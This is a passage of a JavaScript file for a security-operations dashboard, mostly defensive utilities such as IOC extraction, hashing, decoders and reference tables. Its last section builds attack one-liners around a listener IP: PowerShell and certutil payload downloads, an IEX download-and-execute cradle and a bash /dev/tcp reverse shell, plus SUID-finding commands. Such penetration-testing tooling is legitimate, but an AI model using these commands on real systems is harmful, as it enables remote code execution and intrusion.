/* ==========================================================================
   1. Built-in SecOps Reference & Default Bang Extensions
   ========================================================================== */
const EXTRA_BANGS = {
    "!crt ": { label: "crt.sh", url: q => `https://crt.sh/?q=${encodeURIComponent(q)}` },
    "!grey ": { label: "GreyNoise", url: q => `https://viz.greynoise.io/query/${encodeURIComponent(q)}` },
    "!bazaar ": { label: "MalwareBazaar", url: q => `https://bazaar.abuse.ch/browse.php?search=${encodeURIComponent(q)}` },
    "!fox ": { label: "ThreatFox", url: q => `https://threatfox.abuse.ch/browse.php?search=ioc%3A${encodeURIComponent(q)}` },
    "!cisa ": { label: "CISA KEV", url: q => `https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=${encodeURIComponent(q)}` },
    "!lol ": { label: "LOLBAS", url: q => `https://lolbas-project.github.io/#${encodeURIComponent(q)}` }
};

const EVENT_IDS = [
    { service: "Successful Account Logon", port: "Event 4624" },
    { service: "Failed Account Logon (Brute Force / Spray)", port: "Event 4625" },
    { service: "Logon Using Explicit Credentials (RunAs)", port: "Event 4648" },
    { service: "Special Privileges Assigned (Admin Logon)", port: "Event 4672" },
    { service: "New Process Created (CLI Auditing)", port: "Event 4688" },
    { service: "Service Installed in System (Persistence)", port: "Event 4697 / 7045" },
    { service: "Scheduled Task Created / Modified", port: "Event 4698 / 4702" },
    { service: "User Account Created", port: "Event 4720" },
    { service: "Member Added to Security-Enabled Local Group", port: "Event 4732" },
    { service: "Kerberos TGT Requested (AS-REQ)", port: "Event 4768" },
    { service: "Kerberos Service Ticket Requested (Kerberoasting)", port: "Event 4769" },
    { service: "NTLM Credential Validation", port: "Event 4776" },
    { service: "Windows Security Audit Log Cleared", port: "Event 1102" },
    { service: "PowerShell ScriptBlock Logging (Malicious PS)", port: "Event 4104" },
    { service: "Sysmon: Process Creation", port: "Sysmon ID 1" },
    { service: "Sysmon: Network Connection Initiated", port: "Sysmon ID 3" },
    { service: "Sysmon: Process Access (LSASS Dump / ID 10)", port: "Sysmon ID 10" },
    { service: "Sysmon: DNS Query Logged", port: "Sysmon ID 22" }
];

const CHMOD_REF = [
    { service: "Owner RW (`-rw-------`) — SSH Private Keys", port: "chmod 600" },
    { service: "Owner RW, Group/All Read (`-rw-r--r--`) — Configs", port: "chmod 644" },
    { service: "Owner RWX only (`-rwx------`) — Private Scripts", port: "chmod 700" },
    { service: "Owner RWX, Group RX (`-rwxr-x---`) — Group Binaries", port: "chmod 750" },
    { service: "Owner RWX, All RX (`-rwxr-xr-x`) — Standard Exec", port: "chmod 755" },
    { service: "SetUID Bit (`-rwsr-xr-x`) — Executes as File Owner", port: "chmod 4755 / u+s" },
    { service: "SetGID Bit (`-rwxr-sr-x`) — Inherits Group Context", port: "chmod 2755 / g+s" },
    { service: "Sticky Bit (`drwxrwxrwt`) — Shared Dir (/tmp)", port: "chmod 1777 / +t" },
    { service: "Find All SUID Binaries on Linux System", port: "find / -perm -4000 2>/dev/null" },
    { service: "Find All World-Writable Directories", port: "find / -writable -type d 2>/dev/null" }
];

/* ==========================================================================
   2. UI Initialization & Dynamic SecOps Enhancements
   ========================================================================== */
const paletteItems = [];
let activeRefCategory = 'ports';

function initUI() {
    // Merge extra security bangs into CONFIG.bangs without overwriting user choices
    CONFIG.bangs = Object.assign({}, CONFIG.bangs, EXTRA_BANGS);

    document.getElementById('brand-title').textContent = CONFIG.brand.title;
    document.getElementById('brand-subtitle').textContent = CONFIG.brand.subtitle;

    // Inject One-Liner & Transfer Builder into Toolkit navigation if not already present
    const toolkitCat = CONFIG.navigation.find(c => c.category === 'Toolkit');
    if (toolkitCat && toolkitCat.sections[1]) {
        const exists = toolkitCat.sections[1].items.some(i => i.modal === 'shellModal');
        if (!exists) {
            toolkitCat.sections[1].items.push({ label: 'Transfer & Shell One-Liners', modal: 'shellModal' });
        }
    }

    // 1. Render Navigation & Populate Command Palette
    const navContainer = document.getElementById('nav-links');
    navContainer.innerHTML = '';
    CONFIG.navigation.forEach(cat => {
        const navItem = document.createElement('div');
        navItem.className = 'nav-item';
        navItem.tabIndex = 0;
        navItem.textContent = cat.category;

        const dropdown = document.createElement('div');
        dropdown.className = 'dropdown-menu';

        cat.sections.forEach((sec, idx) => {
            if (idx > 0) {
                const divider = document.createElement('div');
                divider.className = 'dropdown-divider';
                dropdown.appendChild(divider);
            }
            const header = document.createElement('div');
            header.className = 'dropdown-header';
            header.textContent = sec.header;
            dropdown.appendChild(header);

            sec.items.forEach(item => {
                const tagHtml = item.tag ? `<span class="dropdown-tag">${item.tag}</span>` : '';
                if (item.url) {
                    const a = document.createElement('a');
                    a.href = item.url;
                    a.target = '_blank';
                    a.rel = 'noopener';
                    a.innerHTML = `${item.label} ${tagHtml}`;
                    dropdown.appendChild(a);
                    paletteItems.push({
                        title: `${item.label} ${item.tag ? `(${item.tag})` : ''}`.trim(),
                        category: cat.category,
                        url: item.url
                    });
                } else if (item.modal) {
                    const btn = document.createElement('button');
                    btn.className = 'dropdown-btn';
                    btn.innerHTML = `${item.label} ${tagHtml}`;
                    btn.onclick = () => openModal(item.modal);
                    dropdown.appendChild(btn);
                    paletteItems.push({
                        title: item.label,
                        category: cat.category,
                        action: () => openModal(item.modal)
                    });
                }
            });
        });

        navItem.appendChild(dropdown);
        navContainer.appendChild(navItem);
    });

    // 2. Render Quick Bang Pills
    const bangBar = document.getElementById('bang-bar');
    bangBar.innerHTML = '';
    Object.entries(CONFIG.bangs).forEach(([prefix, data]) => {
        const btn = document.createElement('button');
        btn.className = 'bang-pill';
        btn.innerHTML = `<span>${prefix.trim()}</span> ${data.label}`;
        btn.onclick = () => applyBang(prefix);
        bangBar.appendChild(btn);
    });

    // 3. Upgrade Existing Modals with Advanced Security Features
    upgradeModals();
    renderReferenceList('ports');
}

function upgradeModals() {
    // A. Add Bulk Log / IOC Extractor to IOC Modal
    const iocCard = document.querySelector('#iocModal .modal-card');
    if (iocCard && !document.getElementById('bulk-ioc-input')) {
        const bulkGroup = document.createElement('div');
        bulkGroup.className = 'tool-group';
        bulkGroup.style.borderTop = '1px solid var(--border-color)';
        bulkGroup.style.paddingTop = '1rem';
        bulkGroup.innerHTML = `
            <div class="tool-label-row">
                <span class="tool-label">Bulk Log / Text IOC Extractor (IPs, Domains, Hashes, CVEs)</span>
                <div style="display:flex; gap:0.4rem;">
                    <button class="tool-btn" style="padding:0.25rem 0.65rem; font-size:0.7rem;" onclick="extractBulkIOCs()">Extract IOCs</button>
                    <button class="tool-btn tool-btn-secondary" style="padding:0.25rem 0.65rem; font-size:0.7rem;" onclick="copyValue('bulk-ioc-input', this)">Copy</button>
                </div>
            </div>
            <textarea id="bulk-ioc-input" class="tool-textarea" rows="4" placeholder="Paste raw firewall logs, email headers, or threat advisories here to extract & deduplicate indicators..."></textarea>
        `;
        iocCard.appendChild(bulkGroup);
    }

    // B. Add Epoch/FileTime & CVSS v3.1 Buttons to Decoder Modal
    const decoderActions = document.querySelector('#decoderModal .tool-actions');
    if (decoderActions && !document.getElementById('btn-epoch')) {
        const clearBtn = decoderActions.lastElementChild;
        const epochBtn = document.createElement('button');
        epochBtn.id = 'btn-epoch';
        epochBtn.className = 'tool-btn tool-btn-secondary';
        epochBtn.textContent = 'Epoch / FileTime';
        epochBtn.onclick = () => transformData('timestamp');

        const cvssBtn = document.createElement('button');
        cvssBtn.className = 'tool-btn tool-btn-secondary';
        cvssBtn.textContent = 'CVSS v3.1 Parse';
        cvssBtn.onclick = () => transformData('cvss');

        decoderActions.insertBefore(epochBtn, clearBtn);
        decoderActions.insertBefore(cvssBtn, clearBtn);
    }

    // C. Add Drag-and-Drop Local File Hasher + VirusTotal Lookup to Hash Modal
    const hashCard = document.querySelector('#hashModal .modal-card');
    if (hashCard && !document.getElementById('file-drop-zone')) {
        const dropGroup = document.createElement('div');
        dropGroup.className = 'tool-group';
        dropGroup.innerHTML = `
            <span class="tool-label">Local File Hasher (100% Client-Side In-Memory)</span>
            <div id="file-drop-zone" style="border:1px dashed var(--border-hover); border-radius:var(--radius-sm); padding:0.9rem; text-align:center; cursor:pointer; background:var(--bg-base); color:var(--text-muted); font-size:0.8rem; transition:all 0.2s;">
                Drag & drop a suspicious binary/script here, or <span style="color:var(--accent-color); font-weight:600;">click to browse</span>
                <input type="file" id="hash-file-input" style="display:none">
            </div>
            <div class="tool-actions" style="justify-content:flex-end;">
                <button class="tool-btn tool-btn-secondary" style="padding:0.35rem 0.75rem; font-size:0.72rem;" onclick="lookupHashVT()">Lookup SHA-256 on VirusTotal ↗</button>
            </div>
        `;
        hashCard.insertBefore(dropGroup, hashCard.children[1]);

        const dropZone = document.getElementById('file-drop-zone');
        const fileInput = document.getElementById('hash-file-input');

        dropZone.onclick = () => fileInput.click();
        fileInput.onchange = (e) => { if (e.target.files[0]) hashLocalFile(e.target.files[0]); };

        dropZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            dropZone.style.borderColor = 'var(--accent-color)';
            dropZone.style.color = 'var(--text-main)';
        });
        dropZone.addEventListener('dragleave', () => {
            dropZone.style.borderColor = 'var(--border-hover)';
            dropZone.style.color = 'var(--text-muted)';
        });
        dropZone.addEventListener('drop', (e) => {
            e.preventDefault();
            dropZone.style.borderColor = 'var(--border-hover)';
            if (e.dataTransfer.files[0]) hashLocalFile(e.dataTransfer.files[0]);
        });
    }

    // D. Add MAC Address Vendor Formatter to Subnet Modal
    const subnetCard = document.querySelector('#subnetModal .modal-card');
    if (subnetCard && !document.getElementById('mac-input')) {
        const macGroup = document.createElement('div');
        macGroup.className = 'tool-group';
        macGroup.style.borderTop = '1px solid var(--border-color)';
        macGroup.style.paddingTop = '1rem';
        macGroup.innerHTML = `
            <span class="tool-label">MAC Address Multi-Vendor Formatter (Cisco / IEEE / Windows)</span>
            <input type="text" id="mac-input" class="tool-input-field" placeholder="Paste MAC (e.g. 00:1a:2b:3c:4d:5e or 001a.2b3c.4d5e)..." oninput="formatMacAddress()">
            <div id="mac-output" style="font-family:var(--font-mono); font-size:0.78rem; color:var(--text-muted); display:flex; justify-content:space-between; flex-wrap:wrap; gap:0.5rem; padding-top:0.2rem;">
                <span>Cisco: <strong id="mac-cisco" style="color:var(--text-main);">-</strong></span>
                <span>Linux: <strong id="mac-linux" style="color:var(--text-main);">-</strong></span>
                <span>Windows: <strong id="mac-win" style="color:var(--text-main);">-</strong></span>
            </div>
        `;
        subnetCard.appendChild(macGroup);
    }

    // E. Add Reference Tabs (Ports / Windows Event IDs / Linux Chmod) to Ports Modal
    const portsCard = document.querySelector('#portsModal .modal-card');
    if (portsCard && !document.getElementById('ref-tabs')) {
        portsCard.querySelector('h3').textContent = 'SecOps Quick Reference Tables';
        const tabBar = document.createElement('div');
        tabBar.id = 'ref-tabs';
        tabBar.className = 'tool-actions';
        tabBar.innerHTML = `
            <button class="tool-btn" id="tab-ports" onclick="switchRefTab('ports')">Network Ports</button>
            <button class="tool-btn tool-btn-secondary" id="tab-events" onclick="switchRefTab('events')">Windows Event IDs</button>
            <button class="tool-btn tool-btn-secondary" id="tab-chmod" onclick="switchRefTab('chmod')">Linux Chmod & SUID</button>
        `;
        portsCard.insertBefore(tabBar, portsCard.children[1]);
    }

    // F. Create Transfer & Reverse Shell One-Liner Modal
    if (!document.getElementById('shellModal')) {
        const shellModal = document.createElement('div');
        shellModal.id = 'shellModal';
        shellModal.className = 'modal-overlay';
        shellModal.innerHTML = `
            <div class="modal-card">
                <div class="modal-header">
                    <h3>File Transfer & Reverse Shell One-Liner Builder</h3>
                    <button class="close-modal" onclick="closeModal('shellModal')">&times;</button>
                </div>
                <div class="subnet-grid">
                    <div class="tool-group">
                        <span class="tool-label">Listener / Host IP (LHOST)</span>
                        <input type="text" id="lhost-input" class="tool-input-field" value="10.0.0.68" oninput="buildOneLiners()">
                    </div>
                    <div class="tool-group">
                        <span class="tool-label">Port / File (e.g. 4444 or payload.sh)</span>
                        <input type="text" id="lport-input" class="tool-input-field" value="8080" oninput="buildOneLiners()">
                    </div>
                </div>
                <div class="port-list" id="oneliner-list" style="max-height:330px;"></div>
            </div>
        `;
        document.body.appendChild(shellModal);
    }
}

/* ==========================================================================
   3. Clock & Greeting
   ========================================================================== */
function updateClock() {
    const now = new Date();
    const tz = CONFIG.brand.timeZone || 'America/Chicago';

    document.getElementById('time').textContent = now.toLocaleTimeString('en-US', {
        timeZone: tz, hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
    });
    document.getElementById('date').textContent = now.toLocaleDateString('en-US', {
        timeZone: tz, weekday: 'short', year: 'numeric', month: 'short', day: 'numeric'
    });

    const currentHour = parseInt(new Intl.DateTimeFormat('en-US', {
        timeZone: tz, hour: 'numeric', hour12: false
    }).format(now), 10);

    const greeting = document.getElementById('greeting');
    if (currentHour < 12) greeting.textContent = 'Good Morning';
    else if (currentHour < 18) greeting.textContent = 'Good Afternoon';
    else greeting.textContent = 'Good Evening';
}

/* ==========================================================================
   4. Modal Controls & Global Keyboard Ergonomics
   ========================================================================== */
const defaultFocusMap = {
    iocModal: 'ioc-input',
    decoderModal: 'decoder-input',
    hashModal: 'hash-input',
    subnetModal: 'subnet-input',
    notepadModal: 'notepad',
    portsModal: 'port-filter',
    cmdModal: 'cmd-input',
    shellModal: 'lhost-input'
};

function openModal(modalId) {
    document.querySelectorAll('.modal-overlay.active').forEach(m => m.classList.remove('active'));
    const modal = document.getElementById(modalId);
    if (!modal) return;
    modal.classList.add('active');

    if (modalId === 'passwordModal') createPassword();
    if (modalId === 'subnetModal') calculateSubnet();
    if (modalId === 'shellModal') buildOneLiners();
    if (modalId === 'cmdModal') {
        document.getElementById('cmd-input').value = '';
        renderCommandPalette('');
    }

    const focusTarget = defaultFocusMap[modalId];
    if (focusTarget) {
        setTimeout(() => document.getElementById(focusTarget)?.focus(), 40);
    }
}

function closeModal(modalId) {
    document.getElementById(modalId)?.classList.remove('active');
}

window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal-overlay')) {
        e.target.classList.remove('active');
    }
});

window.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
        e.preventDefault();
        const cmdModal = document.getElementById('cmdModal');
        cmdModal.classList.contains('active') ? closeModal('cmdModal') : openModal('cmdModal');
        return;
    }

    if (e.key === 'Escape') {
        document.querySelectorAll('.modal-overlay.active').forEach(m => m.classList.remove('active'));
        document.activeElement?.blur();
        return;
    }

    if (e.key === '/' && !['INPUT', 'TEXTAREA'].includes(document.activeElement?.tagName)) {
        e.preventDefault();
        document.getElementById('search-input')?.focus();
    }
});

/* ==========================================================================
   5. Omnibox Search & Bang Triggers
   ========================================================================== */
const searchInput = document.getElementById('search-input');
const searchBadge = document.getElementById('search-badge');

function applyBang(prefix) {
    const current = searchInput.value.replace(/^![a-z]+\s+/i, '');
    searchInput.value = prefix + current;
    searchInput.dispatchEvent(new Event('input'));
    searchInput.focus();
}

searchInput.addEventListener('input', () => {
    const val = searchInput.value.toLowerCase();
    const matchedBang = Object.keys(CONFIG.bangs).find(b => val.startsWith(b));
    if (matchedBang) {
        searchBadge.textContent = CONFIG.bangs[matchedBang].label;
        searchBadge.classList.add('visible');
        searchInput.classList.add('has-badge');
    } else {
        searchBadge.classList.remove('visible');
        searchInput.classList.remove('has-badge');
    }
});

searchInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
        const rawQuery = searchInput.value.trim();
        if (!rawQuery) return;

        const lower = searchInput.value.toLowerCase();
        const matchedBang = Object.keys(CONFIG.bangs).find(b => lower.startsWith(b));

        if (matchedBang) {
            const target = refangString(searchInput.value.slice(matchedBang.length).trim());
            if (target) window.open(CONFIG.bangs[matchedBang].url(target), '_blank', 'noopener');
            return;
        }

        const isUrlOrIp = /^(https?:\/\/)/i.test(rawQuery) ||
            /^(\d{1,3}\.){3}\d{1,3}(:\d+)?(\/.*)?$/.test(rawQuery) ||
            (rawQuery.includes('.') && !rawQuery.includes(' '));

        if (isUrlOrIp) {
            const isPrivateIp = /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[0-1])\.|127\.|localhost)/.test(rawQuery);
            const defaultProto = isPrivateIp ? 'http://' : 'https://';
            const targetUrl = /^https?:\/\//i.test(rawQuery) ? rawQuery : `${defaultProto}${rawQuery}`;
            window.open(targetUrl, '_blank', 'noopener');
        } else {
            window.open(`https://www.google.com/search?q=${encodeURIComponent(rawQuery)}`, '_blank', 'noopener');
        }
    }
});

/* ==========================================================================
   6. IOC Defanger, Pivot Lookup & Bulk Log Extractor
   ========================================================================== */
function defangString(str) {
    return str
        .replace(/https:\/\//gi, 'hxxps[://]')
        .replace(/http:\/\//gi, 'hxxp[://]')
        .replace(/\./g, '[.]');
}

function refangString(str) {
    return str
        .replace(/hxxps\[:\/\/\]/gi, 'https://')
        .replace(/hxxp\[:\/\/\]/gi, 'http://')
        .replace(/hxxps:\/\//gi, 'https://')
        .replace(/hxxp:\/\//gi, 'http://')
        .replace(/\[:\/\/\]/g, '://')
        .replace(/\[\.\]|\(\.\)|\{.\}/g, '.');
}

const iocInput = document.getElementById('ioc-input');
iocInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') pivotSearch('vt');
});

function pivotSearch(engine) {
    const val = refangString(iocInput.value.trim());
    if (!val) return;

    const routes = {
        vt: `https://www.virustotal.com/gui/search/${encodeURIComponent(val)}`,
        shodan: `https://www.shodan.io/search?query=${encodeURIComponent(val)}`,
        urlscan: `https://urlscan.io/search/#${encodeURIComponent(val)}`,
        abuseip: `https://www.abuseipdb.com/check/${encodeURIComponent(val)}`,
        cve: `https://nvd.nist.gov/vuln/search/results?form_type=Advanced&results_type=summary&query=${encodeURIComponent(val)}`
    };

    if (routes[engine]) window.open(routes[engine], '_blank', 'noopener');
}

function extractBulkIOCs() {
    const el = document.getElementById('bulk-ioc-input');
    const raw = refangString(el.value);
    if (!raw.trim()) return;

    const ipv4 = [...new Set(raw.match(/\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g) || [])];
    const cves = [...new Set((raw.match(/\bCVE-\d{4}-\d{4,7}\b/gi) || []).map(c => c.toUpperCase()))];
    const sha256 = [...new Set(raw.match(/\b[a-fA-F0-9]{64}\b/g) || [])];
    const md5 = [...new Set(raw.match(/\b[a-fA-F0-9]{32}\b/g) || [])];
    const urls = [...new Set(raw.match(/https?:\/\/[^\s"'<>]+/gi) || [])];

    const sections = [];
    if (ipv4.length) sections.push(`[IPv4 Addresses (${ipv4.length})]\n${ipv4.join('\n')}`);
    if (urls.length) sections.push(`[URLs (${urls.length})]\n${urls.join('\n')}`);
    if (sha256.length) sections.push(`[SHA-256 Hashes (${sha256.length})]\n${sha256.join('\n')}`);
    if (md5.length) sections.push(`[MD5 Hashes (${md5.length})]\n${md5.join('\n')}`);
    if (cves.length) sections.push(`[CVEs (${cves.length})]\n${cves.join('\n')}`);

    el.value = sections.length ? sections.join('\n\n') : 'No standard IOCs (IPv4, URL, MD5, SHA-256, CVE) detected.';
    if (ipv4.length === 1 && !iocInput.value) iocInput.value = ipv4[0];
}

/* ==========================================================================
   7. Codec, Defang, JWT, Epoch/FileTime & CVSS v3.1 Parser
   ========================================================================== */
function decodeBase64Url(str) {
    let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
    while (base64.length % 4) base64 += '=';
    const binString = atob(base64);
    const bytes = Uint8Array.from(binString, m => m.codePointAt(0));
    return new TextDecoder().decode(bytes);
}

function parseTimestamp(input) {
    const clean = input.trim();
    // 18-digit Windows FileTime / Active Directory LDAP Timestamp
    if (/^\d{18}$/.test(clean)) {
        const ms = (BigInt(clean) / 10000n) - 11644473600000n;
        const d = new Date(Number(ms));
        return `Windows FileTime / AD Timestamp:\nUTC:   ${d.toUTCString()}\nISO:   ${d.toISOString()}\nLocal: ${d.toLocaleString()}\nEpoch: ${Math.floor(d.getTime() / 1000)}`;
    }
    // Unix Epoch Seconds or Milliseconds
    if (/^\d{9,13}$/.test(clean)) {
        const num = parseInt(clean, 10);
        const ms = clean.length <= 10 ? num * 1000 : num;
        const d = new Date(ms);
        return `Unix Epoch Timestamp:\nUTC:   ${d.toUTCString()}\nISO:   ${d.toISOString()}\nLocal: ${d.toLocaleString()}`;
    }
    // Human Date -> Epoch
    const parsed = new Date(clean);
    if (!isNaN(parsed.getTime())) {
        const sec = Math.floor(parsed.getTime() / 1000);
        const filetime = (BigInt(parsed.getTime()) + 11644473600000n) * 10000n;
        return `Date to Timestamp:\nEpoch (s):  ${sec}\nEpoch (ms): ${parsed.getTime()}\nISO-8601:   ${parsed.toISOString()}\nAD FileTime: ${filetime.toString()}`;
    }
    throw new Error('Enter Unix Epoch, 18-digit AD FileTime, or ISO date string.');
}

function parseCvssVector(vector) {
    const map = {
        AV: { N: 'Network', A: 'Adjacent', L: 'Local', P: 'Physical' },
        AC: { L: 'Low', H: 'High' },
        PR: { N: 'None', L: 'Low', H: 'High' },
        UI: { N: 'None', R: 'Required' },
        S: { U: 'Unchanged', C: 'Changed' },
        C: { N: 'None', L: 'Low', H: 'High' },
        I: { N: 'None', L: 'Low', H: 'High' },
        A: { N: 'None', L: 'Low', H: 'High' }
    };
    const labels = {
        AV: 'Attack Vector', AC: 'Attack Complexity', PR: 'Privileges Required',
        UI: 'User Interaction', S: 'Scope', C: 'Confidentiality', I: 'Integrity', A: 'Availability'
    };
    const parts = vector.trim().toUpperCase().split('/');
    const out = [];
    parts.forEach(p => {
        const [k, v] = p.split(':');
        if (map[k] && map[k][v]) {
            out.push(`${labels[k].padEnd(22)}: ${map[k][v]} (${v})`);
        }
    });
    if (!out.length) throw new Error('Invalid CVSS vector (e.g. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)');
    return `// CVSS v3.x Breakdown\n${out.join('\n')}`;
}

function transformData(mode) {
    const input = document.getElementById('decoder-input').value;
    const outputEl = document.getElementById('decoder-output');
    if (!input) return;

    try {
        let result = '';
        if (mode === 'b64encode') {
            const bytes = new TextEncoder().encode(input);
            result = btoa(Array.from(bytes, b => String.fromCodePoint(b)).join(''));
        } else if (mode === 'b64decode') {
            const binString = atob(input.trim());
            result = new TextDecoder().decode(Uint8Array.from(binString, m => m.codePointAt(0)));
        } else if (mode === 'hexencode') {
            const bytes = new TextEncoder().encode(input);
            result = Array.from(bytes, b => b.toString(16).padStart(2, '0')).join(' ');
        } else if (mode === 'hexdecode') {
            const cleanHex = input.replace(/[^0-9a-fA-F]/g, '');
            if (cleanHex.length % 2 !== 0) throw new Error('Odd-length hex string');
            const bytes = new Uint8Array(cleanHex.length / 2);
            for (let i = 0; i < cleanHex.length; i += 2) {
                bytes[i / 2] = parseInt(cleanHex.substring(i, i + 2), 16);
            }
            result = new TextDecoder().decode(bytes);
        } else if (mode === 'urlencode') {
            result = encodeURIComponent(input);
        } else if (mode === 'urldecode') {
            result = decodeURIComponent(input);
        } else if (mode === 'defang') {
            result = defangString(input.trim());
        } else if (mode === 'refang') {
            result = refangString(input.trim());
        } else if (mode === 'timestamp') {
            result = parseTimestamp(input);
        } else if (mode === 'cvss') {
            result = parseCvssVector(input);
        } else if (mode === 'jwt') {
            const parts = input.trim().split('.');
            if (parts.length < 2) throw new Error('Invalid JWT format (expected header.payload.signature)');
            const header = JSON.parse(decodeBase64Url(parts[0]));
            const payload = JSON.parse(decodeBase64Url(parts[1]));

            const meta = [];
            if (payload.iat) meta.push(`Issued At (iat):  ${new Date(payload.iat * 1000).toLocaleString()}`);
            if (payload.exp) {
                const expDate = new Date(payload.exp * 1000);
                const isExpired = Date.now() > payload.exp * 1000;
                meta.push(`Expires (exp):    ${expDate.toLocaleString()} [${isExpired ? 'EXPIRED' : 'VALID'}]`);
            }

            result = `// HEADER\n${JSON.stringify(header, null, 2)}\n\n// PAYLOAD\n${JSON.stringify(payload, null, 2)}`;
            if (meta.length) result += `\n\n// TIMESTAMPS\n${meta.join('\n')}`;
        }
        outputEl.value = result;
    } catch (err) {
        outputEl.value = `Error: ${err.message}`;
    }
}

function clearDecoder() {
    document.getElementById('decoder-input').value = '';
    document.getElementById('decoder-output').value = '';
}

/* ==========================================================================
   8. Native WebCrypto Hash Generator (Text + Local Drag & Drop Files)
   ========================================================================== */
async function computeSubtleHash(algorithm, buffer) {
    const hashBuffer = await crypto.subtle.digest(algorithm, buffer);
    return Array.from(new Uint8Array(hashBuffer))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
}

async function generateHashes() {
    const val = document.getElementById('hash-input').value;
    const sha1El = document.getElementById('hash-sha1');
    const sha256El = document.getElementById('hash-sha256');
    const sha512El = document.getElementById('hash-sha512');

    if (!val) {
        sha1El.value = '';
        sha256El.value = '';
        sha512El.value = '';
        return;
    }

    const encoded = new TextEncoder().encode(val);
    const [sha1, sha256, sha512] = await Promise.all([
        computeSubtleHash('SHA-1', encoded),
        computeSubtleHash('SHA-256', encoded),
        computeSubtleHash('SHA-512', encoded)
    ]);

    sha1El.value = sha1;
    sha256El.value = sha256;
    sha512El.value = sha512;
}

async function hashLocalFile(file) {
    const dropZone = document.getElementById('file-drop-zone');
    dropZone.innerHTML = `Hashing <strong>${file.name}</strong> (${(file.size / 1024).toFixed(1)} KB)...`;

    const arrayBuffer = await file.arrayBuffer();
    const [sha1, sha256, sha512] = await Promise.all([
        computeSubtleHash('SHA-1', arrayBuffer),
        computeSubtleHash('SHA-256', arrayBuffer),
        computeSubtleHash('SHA-512', arrayBuffer)
    ]);

    document.getElementById('hash-sha1').value = sha1;
    document.getElementById('hash-sha256').value = sha256;
    document.getElementById('hash-sha512').value = sha512;
    dropZone.innerHTML = `Hashed: <strong style="color:var(--success-color);">${file.name}</strong> (${(file.size / 1024).toFixed(1)} KB)`;
}

function lookupHashVT() {
    const sha256 = document.getElementById('hash-sha256').value.trim();
    if (sha256) {
        window.open(`https://www.virustotal.com/gui/search/${encodeURIComponent(sha256)}`, '_blank', 'noopener');
    }
}

/* ==========================================================================
   9. IPv4 Subnet Calculator & MAC Address Formatter
   ========================================================================== */
function intToIp(int) {
    return [(int >>> 24) & 255, (int >>> 16) & 255, (int >>> 8) & 255, int & 255].join('.');
}

function calculateSubnet() {
    const raw = document.getElementById('subnet-input').value.trim();
    const match = raw.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})(?:\/(\d{1,2}))?$/);

    if (!match) {
        ['sub-net', 'sub-bcast', 'sub-mask', 'sub-wildcard', 'sub-range', 'sub-hosts'].forEach(id => {
            document.getElementById(id).textContent = 'Invalid CIDR';
        });
        return;
    }

    const octets = [parseInt(match[1], 10), parseInt(match[2], 10), parseInt(match[3], 10), parseInt(match[4], 10)];
    const cidr = match[5] !== undefined ? parseInt(match[5], 10) : 24;

    if (octets.some(o => o > 255) || cidr < 0 || cidr > 32) {
        ['sub-net', 'sub-bcast', 'sub-mask', 'sub-wildcard', 'sub-range', 'sub-hosts'].forEach(id => {
            document.getElementById(id).textContent = 'Out of range';
        });
        return;
    }

    const ipInt = ((octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]) >>> 0;
    const maskInt = cidr === 0 ? 0 : (0xffffffff << (32 - cidr)) >>> 0;
    const wildcardInt = (~maskInt) >>> 0;
    const netInt = (ipInt & maskInt) >>> 0;
    const bcastInt = (netInt | wildcardInt) >>> 0;

    const totalHosts = Math.pow(2, 32 - cidr);
    let usableHosts = totalHosts - 2;
    let rangeStr = `${intToIp((netInt + 1) >>> 0)}  →  ${intToIp((bcastInt - 1) >>> 0)}`;

    if (cidr === 32) {
        usableHosts = 1;
        rangeStr = `${intToIp(netInt)} (Single Host Route)`;
    } else if (cidr === 31) {
        usableHosts = 2;
        rangeStr = `${intToIp(netInt)}  →  ${intToIp(bcastInt)} (PtP RFC 3021)`;
    }

    document.getElementById('sub-net').textContent = `${intToIp(netInt)}/${cidr}`;
    document.getElementById('sub-bcast').textContent = intToIp(bcastInt);
    document.getElementById('sub-mask').textContent = intToIp(maskInt);
    document.getElementById('sub-wildcard').textContent = intToIp(wildcardInt);
    document.getElementById('sub-range').textContent = rangeStr;
    document.getElementById('sub-hosts').textContent = `${usableHosts.toLocaleString()} usable (${totalHosts.toLocaleString()} total)`;
}

function formatMacAddress() {
    const raw = document.getElementById('mac-input').value.replace(/[^0-9a-fA-F]/g, '').toLowerCase();
    if (raw.length !== 12) {
        document.getElementById('mac-cisco').textContent = '-';
        document.getElementById('mac-linux').textContent = '-';
        document.getElementById('mac-win').textContent = '-';
        return;
    }
    const cisco = `${raw.slice(0, 4)}.${raw.slice(4, 8)}.${raw.slice(8, 12)}`;
    const pairs = raw.match(/.{1,2}/g);
    document.getElementById('mac-cisco').textContent = cisco;
    document.getElementById('mac-linux').textContent = pairs.join(':');
    document.getElementById('mac-win').textContent = pairs.join('-').toUpperCase();
}

/* ==========================================================================
   10. File Transfer & Reverse Shell One-Liner Builder
   ========================================================================== */
function buildOneLiners() {
    const ip = document.getElementById('lhost-input')?.value.trim() || '10.0.0.68';
    const port = document.getElementById('lport-input')?.value.trim() || '8080';
    const list = document.getElementById('oneliner-list');
    if (!list) return;

    const snippets = [
        { label: "Python 3 HTTP Server", cmd: `python3 -m http.server ${port}` },
        { label: "PowerShell Download Cradle (IWR)", cmd: `iwr -uri http://${ip}:${port}/payload.exe -OutFile C:\\Windows\\Temp\\payload.exe` },
        { label: "PowerShell In-Memory Exec (IEX)", cmd: `IEX(New-Object Net.WebClient).DownloadString('http://${ip}:${port}/script.ps1')` },
        { label: "Windows Certutil Download", cmd: `certutil.exe -urlcache -split -f "http://${ip}:${port}/payload.exe" payload.exe` },
        { label: "Linux Bash TCP Reverse Shell", cmd: `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
